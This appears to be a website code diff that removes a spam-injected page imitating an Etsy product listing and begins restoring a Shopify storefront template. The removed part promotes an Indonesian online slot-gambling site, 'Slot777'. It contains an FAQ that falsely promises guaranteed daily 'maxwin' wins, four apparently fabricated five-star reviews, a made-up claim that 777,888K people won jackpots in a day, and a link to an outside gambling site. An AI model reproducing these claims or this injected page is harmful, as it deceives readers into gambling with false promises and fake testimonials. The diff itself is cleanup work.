d="M12,21C10.349,21,2,14.688,2,9,2,5.579,4.364,3,7.5,3A6.912,6.912,0,0,1,12,5.051,6.953,6.953,0,0,1,16.5,3C19.636,3,22,5.579,22,9,22,14.688,13.651,21,12,21ZM7.5,5C5.472,5,4,6.683,4,9c0,4.108,6.432,9.325,8,10,1.564-.657,8-5.832,8-10,0-2.317-1.472-4-3.5-4-1.979,0-3.7,2.105-3.721,2.127L11.991,8.1,11.216,7.12C11.186,7.083,9.5,5,7.5,5Z"/></svg></span></div></button></div></div></div>
-</div>
-
-    </div>
-
-    <div class="wt-display-flex-xs"
-        data-component="listing-page-image-carousel"
-        data-palette-listing-id="1790774795"
-        data-shop-id="54267703"
-    >
-
-    <div class="image-carousel-container wt-position-relative wt-flex-xs-6 wt-order-xs-2
-                
-                show-scrollable-thumbnails">
-
-        <ul class="wt-list-unstyled wt-overflow-hidden wt-position-relative carousel-pane-list"
-            style="padding-top: 80%;"
-            data-carousel-pane-list
-            tabindex="0">
-                    <li class=" wt-position-absolute wt-width-full wt-height-full wt-position-top wt-position-left carousel-pane"
-                        data-carousel-pane
-                        data-index="0"
-                        data-image-id="6256816164"
-                        data-palette-listing-image
-                    >
-                        <img class="wt-max-width-full wt-horizontal-center wt-vertical-center carousel-image wt-rounded"
-                            alt="SLOT777"
-                            data-carousel-first-image
-                            data-perf-group="main-product-image"
-                            src="https://ik.imagekit.io/ck1mayks8/slot777.webp"
-                            srcset="https://ik.imagekit.io/ck1mayks8/slot777.webp"
-                            fetchpriority="high"    
-                            data-original-image-width="3000"
-                            data-src-zoom-image="https://ik.imagekit.io/ck1mayks8/slot777.webp"
-                            data-index="0"
-                        />
-                    </li>
-
-        </ul>
-
-    </div>
-
-
-
-        <div
-    class="wt-overlay image-overlay wt-justify-content-center"
-    data-image-overlay
-    data-animate-out="false"
-    id="image-overlay"
-    role="dialog"
-    aria-hidden="true"
->
-    <div class="wt-display-flex-xs wt-justify-content-center wt-height-full image-overlay-main-image-container" data-overlay-modal>
-<button data-clg-id="WtButton" class="wt-btn wt-btn--filled wt-btn--icon wt-btn--light wt-position-absolute wt-position-right wt-position-top wt-mt-xs-2 wt-mr-xs-2" data-wt-overlay-close="true" aria-label="close">
-                <span class="wt-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M13.414,12l6.293-6.293a1,1,0,0,0-1.414-1.414L12,10.586,5.707,4.293A1,1,0,0,0,4.293,5.707L10.586,12,4.293,18.293a1,1,0,1,0,1.414,1.414L12,13.414l6.293,6.293a1,1,0,0,0,1.414-1.414Z"/></svg></span>
-
-</button>
-        <div data-overlay-main-image-container class="wt-position-relative wt-mr-xl-4 wt-mr-xs-2 wt-ml-xs-2 wt-flex-grow-xs-1 wt-mb-xs-4 wt-mt-xs-10">
-<button data-clg-id="WtButton" class="wt-btn wt-btn--filled wt-btn--icon wt-btn--light wt-position-absolute wt-position-left wt-vertical-center wt-shadow-elevation-3 wt-ml-xs-2" data-image-overlay-prev="true" aria-label="previous">
-                        <span class="wt-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M16,21a0.994,0.994,0,0,1-.664-0.253L5.5,12l9.841-8.747a1,1,0,0,1,1.328,1.494L8.5,12l8.159,7.253A1,1,0,0,1,16,21Z"/></svg></span>
-
-</button>
-<button data-clg-id="WtButton" class="wt-btn wt-btn--filled wt-btn--icon wt-btn--light wt-position-absolute wt-position-right wt-vertical-center wt-shadow-elevation-3 wt-mr-xs-2" data-image-overlay-next="true" aria-label="next">
-                        <span class="wt-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M8,21a1,1,0,0,1-.664-1.747L15.5,12,7.336,4.747A1,1,0,0,1,8.664,3.253L18.5,12,8.664,20.747A0.994,0.994,0,0,1,8,21Z"/></svg></span>
-
-</button>
-            <ul class="wt-list-unstyled wt-overflow-hidden image-overlay-list wt-position-relative wt-vertical-center wt-display-flex-xs wt-justify-content-center"
-                    style="padding-top: 80%;"
-                    data-image-overlay-list
-                    tabindex="0"
-                >
-                    <li class="wt-display-none wt-position-absolute wt-position-top wt-position-left wt-width-full wt-height-full skeleton-background"
-                        data-listing-image
-                        data-index="0"
-                        data-image-id="6256816164"
-                    >
-                        <img class="wt-rounded wt-overflow-hidden image-overlay-img wt-object-fit-contain wt-vertical-center"
-                            alt="SLOT777"
-                            
-                            data-delay-src="https://i.etsystatic.com/54267703/r/il/f18987/6256816164/il_1140xN.6256816164_26ap.jpg"
-                            data-delay-srcset="https://i.etsystatic.com/54267703/r/il/f18987/6256816164/il_1140xN.6256816164_26ap.jpg 1x, https://i.etsystatic.com/54267703/r/il/f18987/6256816164/il_1588xN.6256816164_26ap.jpg 2x"
-                            data-original-image-width="3000"
-                            data-original-image-height="3000"
-                            data-index="0"
-                            data-src-zoom-image="https://ik.imagekit.io/ck1mayks8/slot777.webp"
-                        />
-                    </li>
-
-                <div class="wt-z-index-1 click-to-zoom-text wt-position-absolute wt-display-none"
-                     data-click-to-zoom-toast>
-<span data-clg-id="WtBadge" class="wt-badge wt-badge--default wt-text-body-01">
-                        <span class="wt-icon wt-icon--smallest"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M10,2a8,8,0,1,0,8,8A8.009,8.009,0,0,0,10,2Zm0,14a6,6,0,1,1,6-6A6.007,6.007,0,0,1,10,16Z"/><path d="M14,9H11V6A1,1,0,1,0,9,6V9H6a1,1,0,0,0,0,2H9v3a1,1,0,1,0,2,0V11h3A1,1,0,0,0,14,9Z"/><path d="M21.707,20.293l-4-4a1,1,0,0,0-1.414,1.414l4,4A1,1,0,0,0,21.707,20.293Z"/></svg></span>
-                    Click to zoom
-
-</span>
-                </div>
-            </ul>
-        </div>
-
-    </div>
-</div>
-</div>
-</div>
-
-<div class="wt-display-flex-xs wt-justify-content-flex-end wt-mt-xs-3">
-        <button
-        data-overlay-trigger
-        aria-controls="report-item-overlay"
-        id="report-overlay-trigger" 
-        class="wt-btn wt-btn--transparent wt-btn--small">
-        <span class="wt-icon wt-icon--smaller-xs wt-nudge-r-4"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path fill-rule="evenodd" clip-rule="evenodd" d="M7 3a1 1 0 0 0-2 0v18a1 1 0 1 0 2 0v-6h14.766l-3.6-6 3.6-6zm0 2v8h11.234l-2.4-4 2.4-4z"/></svg></span>Report this item to Etsy
-    </button>
-    </div>
-
-<style>
-  .faq-table {
-    width: 100%;
-    border-collapse: collapse;
-    margin: 20px 0;
-    font-family: Arial, sans-serif;
-  }
-
-  .faq-table td {
-    padding: 12px 10px;
-    vertical-align: top;
-  }
-
-  /* Kolom kiri: pertanyaan */
-  .faq-question {
-    font-weight: bold;
-    width: 35%;
-    color: #000;
-  }
-
-  /* Kolom kanan: jawaban */
-  .faq-answer {
-    color: #333;
-  }
-
-  /* Border tabel (opsional, bisa dipakai / hapus) */
-  .faq-table tr {
-    border-bottom: 1px solid #e0e0e0;
-  }
-
-  /* Ubah warna tema di sini */
-  .faq-question {
-    color: #ff0000ff;     /* warna pertanyaan */
-  }
-
-  .faq-answer {
-    color: #3d3d3d;  /* warna jawaban */
-  }
-</style>
-
-<table class="faq-table">
-  <tbody>
-
-    <tr>
-      <td class="faq-question">Apa itu Slot777?</td>
-      <td class="faq-answer">Slot777 adalah situs slot gacor yang menyediakan permainan slot maxwin dengan peluang menang maksimal, aman, dan terpercaya, khususnya untuk menyambut Tahun Baru 2026.</td>
-    </tr>
-
-    <tr>
-      <td class="faq-question">Mengapa Slot777 disebut Situs Slot Gacor?</td>
-      <td class="faq-answer">Karena slot777 adalah situs yang menyediakan banyak sekali provider pilihan rtp slot maxwin yang bisa kamu pilih dan mainkan, Dan serta pasti menjaminan kamu pasti mendapatkan kemenangan maxwin setiap hari.</td>
-    </tr>
-
-    <tr>
-      <td class="faq-question">Bagaimana cara mendaftar di Slot777?</td>
-      <td class="faq-answer">Cukup kunjungi situs gacor slot777, isi formulir pendaftaran dengan data valid, dan lakukan verifikasi akun. Setelah itu, kamu bisa langsung bermain dan mencoba meraih kemenangan maxwin.</td>
-    </tr>
-
-    <tr>
-      <td class="faq-question">Apakah slot777 aman dimainkan?</td>
-      <td class="faq-answer">Ya, Slot777 merupakan situs slot gacor yang menggunakan sistem keamanan terupdate, sehingga semua data dan transaksi pemain terlindungi dengan baik.</td>
-    </tr>
-
-    <tr>
-      <td class="faq-question">Apakah ada bonus atau fitur khusus Tahun Baru 2026?</td>
-      <td class="faq-answer">Slot777 bukan hanya menghadirkan bonus atau promo special tahun baru, Tapi slot gaor menghadirkan promo dan bonus special setiap hari. Dan fitur free spin atau putaran gratis untuk meraih maxwin di tahun 2026.</td>
-    </tr>
-
-  </tbody>
-</table>
-
-<!-- TABLE REVIEW 1 -->
-<table border="1" cellpadding="10" cellspacing="0" width="100%" style="margin-bottom:20px;">
-  <tr>
-    <th>Nama Pengguna</th>
-    <th>Ulasan</th>
-    <th>Rating</th>
-  </tr>
-  <tr>
-    <td>Ferdy</td>
-    <td>Main slot di slot777 terasa nyaman karena gamenya variatif dan nggak ngebosenin. Putarannya halus, tampilannya juga enak dilihat. Buat yang suka cari slot gacor, Slot777 cukup sering kasih pola permainan yang bikin betah main lama-lama.</td>
-    <td>⭐⭐⭐⭐⭐</td>
-  </tr>
-</table>
-
-<!-- TABLE REVIEW 2 -->
-<table border="1" cellpadding="10" cellspacing="0" width="100%" style="margin-bottom:20px;">
-  <tr>
-    <th>Nama Pengguna</th>
-    <th>Ulasan</th>
-    <th>Rating</th>
-  </tr>
-  <tr>
-    <td>Aseng</td>
-    <td>Yang saya suka dari Slot777, pilihan slotnya banyak dan nggak cuma satu provider aja. Jadi bisa ganti-ganti game sesuai mood. Beberapa kali juga kerasa dapet momen enak, apalagi pas event Tahun Baru 2026, peluang maxwin terasa lebih kebuka.</td>
-    <td>⭐⭐⭐⭐⭐</td>
-  </tr>
-</table>
-
-<!-- TABLE REVIEW 3 -->
-<table border="1" cellpadding="10" cellspacing="0" width="100%" style="margin-bottom:20px;">
-  <tr>
-    <th>Nama Pengguna</th>
-    <th>Ulasan</th>
-    <th>Rating</th>
-  </tr>
-  <tr>
-    <td>Abeng</td>
-    <td>Di Slot Gacor, main slot bisa disesuaikan sama modal. Nggak harus besar, tapi masih ada peluang dapet hasil. Cocok buat yang mau main santai sambil nyari cuan pelan-pelan. Buat ukuran situs slot gacor maxwin, sistemnya terasa fair dan nggak aneh-aneh.</td>
-    <td>⭐⭐⭐⭐⭐</td>
-  </tr>
-</table>
-
-<!-- TABLE REVIEW 4 -->
-<table border="1" cellpadding="10" cellspacing="0" width="100%">
-  <tr>
-    <th>Nama Pengguna</th>
-    <th>Ulasan</th>
-    <th>Rating</th>
-  </tr>
-  <tr>
-    <td>Agus</td>
-    <td>Situs Slot777 jarang gangguan, jadi pas main slot nggak kepotong masalah teknis. Ini penting banget, apalagi pas lagi dapet momentum bagus. Secara keseluruhan, Slot Maxwin layak dicoba buat yang pengin cari maxwin di awal tahun 2026 dengan suasana main yang tenang.</td>
-    <td>⭐⭐⭐⭐⭐</td>
-  </tr>
-</table>
-
-    
-<div data-wt-overlay data-report-item-overlay id="report-item-overlay" class="wt-overlay wt-display-none" role="dialog" aria-hidden="true" aria-modal="false" aria-label ="report-item-overlay-title">
-        <div class="wt-overlay__modal" data-overlay-modal>
-            <button class="wt-btn wt-btn--icon wt-btn--tertiary wt-btn--light wt-overlay__close-icon" data-wt-overlay-close aria-label="Close">
-                <span class="etsy-icon wt-icon--smaller"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M13.414,12l6.293-6.293a1,1,0,0,0-1.414-1.414L12,10.586,5.707,4.293A1,1,0,0,0,4.293,5.707L10.586,12,4.293,18.293a1,1,0,1,0,1.414,1.414L12,13.414l6.293,6.293a1,1,0,0,0,1.414-1.414Z"/></svg></span>
-            </button>
-            <div data-report-item-form-container class="wt-display-none">
-    <div class="wt-overlay__header report-item-step">
-        <h2 class="wt-text-heading" id="report-item-overlay-title">What’s wrong with this listing?</h2>
-    </div>
-    <div class="wt-overlay__header report-item-step wt-display-none">
-        <h3 class="wt-text-heading" id="report-item-overlay-title-more">Add more details</h3>
-        <h3 class="wt-text-body-01 wt-mt-xs-3">Share more specifics to help us review this item and protect our marketplace.</h3>
-    </div>
-    <form data-report-item-form
-          action="/add_report.php"
-          method="post">
-        <div class="report-item-step">
-            <div class="wt-select wt-mb-xs-3">
-                <select class="wt-select__element"
-                        id="report-item-choices"
-                        data-report-item-choices>
-                    <optgroup>
-                        <option value="default">Choose a reason…</option>
-                        <option value="order-problem">There’s a problem with my order</option>
-                        <option value="ip-policy">It uses my intellectual property without permission</option>
-                        <option value="flag-item">I don’t think it meets Etsy’s policies</option>
-                    </optgroup>
-                </select>
-                <label for="report-item-choices" class="wt-screen-reader-only">Choose a reason…</label>
-            </div>
-            <div data-report-choice="order-problem" id="order-problem" class="wt-display-none">
-                <p class="wt-mb-xs-2 prose">The first thing you should do is contact the seller directly.</p>
-                <p class="wt-mb-xs-2 ip-policy prose">If you’ve already done that, your item hasn’t arrived, or it’s not as described, you can report that to Etsy by opening a case.</p>
-                <p class="wt-mb-xs-2 prose">
-                    <a href="/help/article/5307" target="_blank">
-                        Report a problem with an order
-                    </a>
-                </p>
-            </div>
-            <div data-report-choice="ip-policy" id="ip-policy" class="wt-display-none">
-                <p class="wt-mb-xs-2 prose">We take intellectual property concerns very seriously, but many of these problems can be resolved directly by the parties involved. We suggest contacting the seller directly to respectfully share your concerns.</p>
-                <p class="wt-mb-xs-2 prose">If you’d like to file an allegation of infringement, you’ll need to follow the process described in our <a href='/legal/ip' target='_blank'>Copyright and Intellectual Property Policy</a>.</p>
-            </div>
-            <div data-report-choice="flag-item" id="flag-item" class="wt-display-none">
-                <div class="wt-mb-xs-2">
-                    <a href="/legal/sellers#allowed" target="_blank">
-                        Review how we define handmade, vintage and supplies
-                    </a>
-                </div>
-                <div class="wt-mb-xs-2">
-                    <a href="/legal/prohibited" target="_blank">
-                        See a list of prohibited items and materials
-                    </a>
-                </div>
-                <div class="wt-mb-xs-4">
-                    <a href="/legal/policy/listing-mature-content-correctly/242665462117" target="_blank">
-                        Read our mature content policy
-                    </a>
-                </div>
-                <div data-report-reason class="wt-validation">
-                    <fieldset class="wt-mb-xs-4">
-                        <legend class="wt-label wt-mb-xs-2">Tell us why you're reporting this item</legend>
-                            <div class="wt-radio wt-mb-xs-1">
-                                <input
-                                        data-report-reason-input
-                                        data-flag-name="not_handmade_vintage_or_craft"
-                                        type="radio"
-                                        class="wt-radio"
-                                        id="flag_not_handmade_vintage_or_craft"
-                                        name="flag_type_mnemonic"
-                                        value="LISTING_CSV_MEMBER_FLAG">
-                                <label for="flag_not_handmade_vintage_or_craft">It's not handmade, vintage, or craft supplies</label>
-                            </div>
-                            <div class="wt-radio wt-mb-xs-1">
-                                <input
-                                        data-report-reason-input
-                                        data-flag-name="pornographic"
-                                        type="radio"
-                                        class="wt-radio"
-                                        id="flag_pornographic"
-                                        name="flag_type_mnemonic"
-                                        value="OC_PORNOGRAPHY">
-                                <label for="flag_pornographic">It's pornographic</label>
-                            </div>
-                            <div class="wt-radio wt-mb-xs-1">
-                                <input
-                                        data-report-reason-input
-                                        data-flag-name="hate_speech_or_harassment"
-                                        type="radio"
-                                        class="wt-radio"
-                                        id="flag_hate_speech_or_harassment"
-                                        name="flag_type_mnemonic"
-                                        value="OC_HATE_VIOLENT_HARMFUL">
-                                <label for="flag_hate_speech_or_harassment">It's hate speech or harassment</label>
-                            </div>
-                            <div class="wt-radio wt-mb-xs-1">
-                                <input
-                                        data-report-reason-input
-                                        data-flag-name="minor_safety"
-                                        type="radio"
-                                        class="wt-radio"
-                                        id="flag_minor_safety"
-                                        name="flag_type_mnemonic"
-                                        value="LISTING_MINOR_SAFETY">
-                                <label for="flag_minor_safety">It's a threat to minor safety</label>
-                            </div>
-                            <div class="wt-radio wt-mb-xs-1">
-                                <input
-                                        data-report-reason-input
-                                        data-flag-name="violence_or_self_harm"
-                                        type="radio"
-                                        class="wt-radio"
-                                        id="flag_violence_or_self_harm"
-                                        name="flag_type_mnemonic"
-                                        value="OC_HATE_VIOLENT_HARMFUL">
-                                <label for="flag_violence_or_self_harm">It promotes violence or self-harm</label>
-                            </div>
-                            <div class="wt-radio wt-mb-xs-1">
-                                <input
-                                        data-report-reason-input
-                                        data-flag-name="dangerous_or_hazardous"
-                                        type="radio"
-                                        class="wt-radio"
-                                        id="flag_dangerous_or_hazardous"
-                                        name="flag_type_mnemonic"
-                                        value="LISTING_PROHIBITED">
-                                <label for="flag_dangerous_or_hazardous">It's dangerous or hazardous</label>
-                            </div>
-                            <div class="wt-radio wt-mb-xs-1">
-                                <input
-                                        data-report-reason-input
-                                        data-flag-name="violates_law"
-                                        type="radio"
-                                        class="wt-radio"
-                                        id="flag_violates_law"
-                                        name="flag_type_mnemonic"
-                                        value="CC_REPORTED_ILLEGAL_CONTENT">
-                                <label for="flag_violates_law">It's violating a specific law or regulation</label>
-                            </div>
-                            <div class="wt-radio wt-mb-xs-1">
-                                <input
-                                        data-report-reason-input
-                                        data-flag-name="violates_not_listed_policy"
-                                        type="radio"
-                                        class="wt-radio"
-                                        id="flag_violates_not_listed_policy"
-                                        name="flag_type_mnemonic"
-                                        value="LISTING_PROHIBITED">
-                                <label for="flag_violates_not_listed_policy">It violates a policy that's not listed here</label>
-                            </div>
-                        <div data-error="no-report-reason" id="no-report-reason" class="wt-validation__message wt-validation__message--is-hidden wt-sem-text-critical">Please choose a reason</div>
-                    </fieldset>
-                </div>
-            </div>
-        </div>
-        <div class="report-item-step wt-display-none">
-            <div data-report-comment class="wt-validation" tabindex="0">
-                <label class="wt-screen-reader-only" for="report-item-reason">Include anything else we should know about this item</label>
-                <textarea id="report-item-reason" data-report-comment-input name="reason" class="wt-textarea" placeholder="Include anything else we should know about this item"></textarea>
-                <div data-error="no-report-comment" id="no-report-comment" class="wt-validation__message wt-validation__message--is-hidden wt-sem-text-critical wt-mt-xs-2">
-                    <span class="wt-icon wt-sem-text-on-surface-dark wt-validation__icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path fill-rule="evenodd" clip-rule="evenodd" d="M11 6v8h2V6zm1 9.25a1.25 1.25 0 1 0 0 2.5 1.25 1.25 0 0 0 0-2.5"/></svg></span>&nbsp;Make sure to add more details.
-                </div>
-                <div data-error="comment-min-length-illegal-content" id="comment-min-length-illegal-content" class="wt-validation__message wt-validation__message--is-hidden wt-sem-text-critical wt-mt-xs-2">
-                    <span class="wt-icon wt-sem-text-on-surface-dark wt-validation__icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path fill-rule="evenodd" clip-rule="evenodd" d="M11 6v8h2V6zm1 9.25a1.25 1.25 0 1 0 0 2.5 1.25 1.25 0 0 0 0-2.5"/></svg></span>&nbsp;Add more details, including a law or regulation name (10 characters min).
-                </div>
-            </div>
-        </div>
-        <div data-report-bonafide class="wt-mt-xs-2 wt-mb-xs-2 wt-sem-text-secondary wt-display-none">
-            By submitting this report, you confirm the information and claims in this form are accurate.
-        </div>
-        <div data-report-item-overlay-footer class="wt-overlay__footer wt-pt-xs-0 wt-display-none" id="overlay-footer">
-            <input type="hidden" name="_nnc" value="3:1758149097:4GUgvh8y5DkVyZZtcEO3WxW_bLVi:fb034c7c38a6074451032687692e755919fbe37e1c1c835e8258dc34b14fb936" class="hidden csrf" />
-            <input type="hidden"
-                   name="target_id"
-                   value="1790774795"/>
-            <input type="hidden"
-                   name="target_type"
-                   value="listing"/>
-            <input type='hidden'
-                   name='send_report'
-                   value='true'/>
-            <input type='hidden'
-                   name='ref'
-                   value="rlp-listing-grid-2"/>
-            <input type='hidden'
-                   name='platform'
-                   value="web"/>
-            <input type='hidden'
-                   name='search_query'
-                   value=""/>
-            <div class="wt-overlay__footer__cancel">
-                <button data-report-back-button type="button"
-                        class="wt-btn wt-btn-transparent report-item-step wt-display-none">
-                    Go back
-                </button>
-            </div>
-            <div class="wt-overlay__footer__action">
-                <button data-report-next-button type="button"
-                        class="wt-btn wt-btn--primary report-item-step">
-                    Next
-                </button>
-                <button data-report-submit-button type="submit"
-                        class="wt-btn wt-btn--primary report-item-step wt-display-none">
-                    Submit report
-                </button>
-            </div>
-        </div>
-    </form>
-</div>
-        </div>
-    </div>
-                        </div>
-                    </div>
-
-                    <div class="cart-col wt-order-xs-2 wt-mb-lg-5">
-    <div id="listing-page-cart" class="wt-display-flex-lg wt-flex-direction-column-md wt-flex-lg-3 wt-pl-md-4 wt-pr-md-4 wt-pl-lg-0 wt-pr-lg-5 wt-pl-xs-2 wt-pr-xs-2">
-            <div class="wt-mb-xs-1 wt-mt-xs-1">
-                <div data-appears-component-name="Etsy-Modules-ListingPage-UrgencySignal-RecsRankingApiSpec" data-appears-event-data='{"module_placement":"lp_urgency_signals","datasets":["Common_Signal_CustomCandidatesSignalRankerV0"],"targets":[],"logging_class":"Etsy\\Modules\\ListingPage\\UrgencySignal\\RecsRankingApiSpec","page_listing_id":1790774795,"mmx_request_uuid_map":{"51316eeb-34a2-4c96-9fa3-3a44d56e2d4d":[0,1]},"candidate_source_map":{"signals-extractor":[0,1]},"second_pass_ranker_map":{"signals-ranker-v0":[0,1]},"client_provided_features":{"browser":{"acceptLanguage":"en-GB","browser":"Chrome","currency":"IDR","localeRegion":"ID","operatingSystem":"Windows 11","platform":"desktop","platformEtsyApp":"web","platformMobileDevice":"unidentified","source":"directLanding"},"date_time":{"dayOfWeek":"3","hourOfDay":"22"},"user":{"locationLatitude":null,"locationLongitude":null,"locationZip":"unidentified","userPreferredLanguage":"en-GB"}},"scores":[0.47744357585906982421875,0.222189426422119140625],"datasets_map":{"Common_Signal_CustomCandidatesSignalRankerV0":[0,1]},"target_listing_id":1790774795,"candidates":["in_cart_only","lp_views_only"],"refTag":"lp_urgency_signals","signals":["in_cart_only","lp_views_only"],"rec_event_name":"recommendations_module"}' class='recs-appears-logger'>
-<p class="wt-text-title-01 wt-sem-text-critical "
-   
->Selama 24 jam terakhir sebanyak 777,888K orang yang sudah berhasil mendapatkan jackpot!</p>
-</div>
-            </div>
-        <div class="wt-display-flex-xs wt-align-items-center">
-            <div data-appears-component-name="price">
-<div class="wt-display-flex-xs  wt-align-items-center wt-flex-wrap"
-     data-selector="price-only"
-     data-buy-box-region="price"
->
-        <p class="wt-text-title-larger wt-mr-xs-1
-                
-            "
-        >
-        <span class="wt-screen-reader-only">Price:</span>Rp25,000
-    </p>
-        
-    <div data-clg-id="WtSpinner" class="wt-spinner wt-spinner--01 wt-display-none" aria-live="assertive" data-buy-box-price-spinner="">
-        <span class="wt-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><circle fill="transparent" cx="12" cy="12" r="10"/></svg></span>
-        Loading
-    </div>
-
-</div>
-</div>
-        </div>
-        
-        <div data-buy-box-region="vat_messaging">
-        <div class="wt-sem-text-secondary wt-text-caption wt-pt-xs-1 wt-pb-xs-1">
-            SLOT MAXWIN
-        </div>
-</div>
-        
-        
-        
-<div class="wt-mt-xs-1 wt-mb-xs-1">
-<h1>Slot777 | Situs Slot Gacor Terpercaya Hari Ini Rtp Slot Maxwin Terbaik 2025</h1><br>
-<p data-buy-box-listing-title="true" tabindex="0" class="wt-line-height-tight wt-break-word wt-text-body">
-Slot777 adalah situs slot gacor terpercaya paling top mudah untuk merasakan kemenangan yang tinggi di hari ini dengan rtp slot maxwin terbaik hari ini mari bergabung dengan slot777 gampang menang hari ini untuk merasakan kemenangan yang sangat besar di beragam jenis permainan slot gacor hari ini.
-</p>
-
-            </div>
-        <div class="wt-mb-xs-3">
-            <div class="wt-display-inline-flex-xs wt-align-items-center wt-flex-wrap lp-shop-header">
-    <div class="wt-display-inline-flex-xs wt-align-items-center
-        
-    ">
-        <span class="wt-text-title-small">
-    <a href="https://tunari-online.ro/" class="wt-text-link-no-underline wt-sem-text-primary">
-        BANDAR SLOT GACOR
+<body class="gradient animate--hover-default" data-template="product">
+    <a class="skip-to-content-link button visually-hidden" href="#MainContent">
+        Skip to content
     </a>
-</span>
-            &nbsp;<div class="wt-popover star-seller-badge-listing-page" data-wt-popover>
-    <button data-wt-popover-trigger class="wt-popover__trigger wt-popover__trigger--underline" aria-label="Star Seller" aria-describedby="star-seller-popover">
-        <span class="wt-icon wt-icon--smaller-xs wt-icon--core wt-fill-star-seller-dark" alt="star_seller"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="m20.902 7.09-2.317-1.332-1.341-2.303H14.56L12.122 2 9.805 3.333H7.122L5.78 5.758 3.341 7.09v2.667L2 12.06l1.341 2.303v2.666l2.318 1.334L7 20.667h2.683L12 22l2.317-1.333H17l1.342-2.303 2.317-1.334v-2.666L22 12.06l-1.341-2.303V7.09zm-6.097 6.062.732 3.515-.488.363-2.927-1.818-3.049 1.697-.488-.363.732-3.516-2.56-2.181.121-.485 3.537-.243 1.341-3.273h.488l1.341 3.273 3.537.243.122.484z"/></svg></span>
-    </button>
-    <div class="wt-p-xs-3" id="star-seller-popover" role="tooltip">
-        <p class="wt-mb-xs-1 wt-text-title-01">
-            Star Seller
-        </p>
-        <p class="wt-text-caption">
-            Star Sellers have an outstanding track record for providing a great customer experience – they consistently earned 5-star reviews, dispatched orders on time, and replied quickly to any messages they received.
-        </p>
-    </div>
-</div>
-    </div>
-        <div class="wt-ml-xs-1">
-            <div class="wt-text-link-no-underline review-stars-text-decoration-none">
-    <a href="#reviews" data-click-source="review_stars" aria-label="5 out of 5 stars. See reviews."><span class="wt-display-inline-block wt-mr-xs-1" data-stars-svg-container>
-    <input type="hidden" name="initial-rating" value="5" />
-    <input type="hidden" name="rating" value="5" />
-    <span class="wt-screen-reader-only">5 out of 5 stars</span>
 
-    <span>
-            <span class="wt-icon wt-nudge-b-1 wt-icon--smallest" data-rating="0"><svg xmlns="http://www.w3.org/2000/svg" viewBox="3 3 18 18" aria-hidden="true" focusable="false"><path d="M20.83,9.15l-6-.52L12.46,3.08h-.92L9.18,8.63l-6,.52L2.89,10l4.55,4L6.08,19.85l.75.55L12,17.3l5.17,3.1.75-.55L16.56,14l4.55-4Z"/></svg></span>
-            <span class="wt-icon wt-nudge-b-1 wt-icon--smallest" data-rating="1"><svg xmlns="http://www.w3.org/2000/svg" viewBox="3 3 18 18" aria-hidden="true" focusable="false"><path d="M20.83,9.15l-6-.52L12.46,3.08h-.92L9.18,8.63l-6,.52L2.89,10l4.55,4L6.08,19.85l.75.55L12,17.3l5.17,3.1.75-.55L16.56,14l4.55-4Z"/></svg></span>
-            <span class="wt-icon wt-nudge-b-1 wt-icon--smallest" data-rating="2"><svg xmlns="http://www.w3.org/2000/svg" viewBox="3 3 18 18" aria-hidden="true" focusable="false"><path d="M20.83,9.15l-6-.52L12.46,3.08h-.92L9.18,8.63l-6,.52L2.89,10l4.55,4L6.08,19.85l.75.55L12,17.3l5.17,3.1.75-.55L16.56,14l4.55-4Z"/></svg></span>
-            <span class="wt-icon wt-nudge-b-1 wt-icon--smallest" data-rating="3"><svg xmlns="http://www.w3.org/2000/svg" viewBox="3 3 18 18" aria-hidden="true" focusable="false"><path d="M20.83,9.15l-6-.52L12.46,3.08h-.92L9.18,8.63l-6,.52L2.89,10l4.55,4L6.08,19.85l.75.55L12,17.3l5.17,3.1.75-.55L16.56,14l4.55-4Z"/></svg></span>
-            <span class="wt-icon wt-nudge-b-1 wt-icon--smallest" data-rating="4"><svg xmlns="http://www.w3.org/2000/svg" viewBox="3 3 18 18" aria-hidden="true" focusable="false"><path d="M20.83,9.15l-6-.52L12.46,3.08h-.92L9.18,8.63l-6,.52L2.89,10l4.55,4L6.08,19.85l.75.55L12,17.3l5.17,3.1.75-.55L16.56,14l4.55-4Z"/></svg></span>
-    </span>
-</span></a>
-</div>
-        </div>
-    
-</div>
-        </div>
-        <div class="wt-mb-xs-6 wt-mb-lg-0">
-            <div data-buy-box>
-    <div class="wt-mb-xs-3">
-        
-        
-        <div data-appears-component-name="variations">
-<div data-selector="listing-page-variations">
-    
-</div>
-</div>
-        
-        
-    </div>
-    
- 
-        <div class="wt-display-flex-xs wt-flex-direction-column-xs wt-flex-wrap wt-flex-direction-column-lg wt-flex-gap-xs-2">
+    <div id="shopify-section-announcement_bar_slider" class="shopify-section">
+        <script
+            src="//www.istudiosg.com/cdn/shop/t/14/assets/announcement-bar-slider.js?v=142197795293918470981742784887"
+            defer="defer"></script>
 
+        <div class="hura-announcement-bar slider-container">
+            <div class="hura-messages swiper-wrapper">
+                <div class="hura-message swiper-slide slick-slide">
 
-            <div class="wt-flex-xs-1 wt-mr-lg-0"
-     data-buy-box-region="express_checkout_button"
-     data-shop-currency="IDR"
-     data-shop-id="54267703"
-     data-is-eu-buyer="false"
-     data-listing-id="1790774795"
-     data-buyer-currency=""
-     data-is-guest-checkout="false">
-        <form
-            action="/cart/listing/1790774795"
-            method="post"
-            class="add-to-cart-form checkout-single-listing-form
-            "
-        >
-            <input type="hidden" name="_nnc" value="3:1758149097:qZIltsybkZo_woVcQ6GhSBioQEaY:3a59f90f2019ccffb3700cb9dba97128064c900f44ffca5c723523809a2f9267" class="hidden csrf" />
-
-<input type="hidden" name="listing_id" value="1790774795"/>
-<input type="hidden" name="quantity" value="1"/>
